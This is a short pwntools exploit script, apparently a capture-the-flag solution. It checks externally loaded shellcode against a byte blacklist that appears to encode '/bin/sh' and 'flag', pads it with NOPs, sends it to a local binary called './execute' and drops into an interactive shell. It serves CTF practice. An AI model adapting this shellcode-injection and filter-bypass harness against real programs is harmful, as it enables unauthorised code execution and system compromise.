from pwn import *

# Read the shellcode
with open('shellcode-raw', 'rb') as f:
    shell = f.read()

# Blacklisted bytes (hex strings that are blocked)
black = 'f668736e6962543b' + '67616c66c95fc0d2'
black_bytes = bytes.fromhex(black)

print(f"[*] Shellcode length: {len(shell)} bytes")
print(f"[*] Shellcode hex: {shell.hex()}")
print(f"[*] Blacklist hex:  {black}")

# Check if any blacklisted bytes are in our shellcode
bad_bytes_found = []
for i, s in enumerate(shell):
    if s in black_bytes:
        bad_bytes_found.append((i, s))
        print(f"[!] Blacklisted byte found at offset {i}: {s:#04x}")

if not bad_bytes_found:
    print("[+] No blacklisted bytes found! Shellcode is clean.")
else:
    print(f"[!] Warning: Found {len(bad_bytes_found)} blacklisted byte(s)")

# Connect to the process
p = process('./execute')

# Create payload (pad to 60 bytes with NOPs if needed)
payload = shell + (60 - len(shell)) * b'\x90'

print(f"[*] Payload length: {len(payload)} bytes")
print(f"[*] Payload hex: {payload.hex()}")

# Receive initial output
try:
    output = p.recvall(timeout=3).decode()
    print(f"[*] Received:\n{output}")
except:
    pass

# Send the payload
p.sendline(payload)

# Go interactive
p.interactive()